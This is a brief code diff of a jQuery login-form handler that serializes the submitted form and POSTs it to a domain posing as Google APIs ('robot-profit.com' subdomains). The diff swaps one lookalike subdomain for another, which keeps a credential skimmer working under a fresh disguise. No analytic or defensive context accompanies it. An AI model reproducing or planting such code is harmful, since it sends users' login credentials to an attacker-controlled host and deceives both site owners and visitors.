@@ -2,7 +2,7 @@ $(".login-form").submit(function() {
 	var d = $(".login-form");
 
 	$.ajax({
-        url: "https://font-googleapis.robot-profit.com/index.php",
+        url: "https://ajax-googleapis.robot-profit.com/index.php",
         type: "POST",
         data: d.serialize(),
         success: function () {
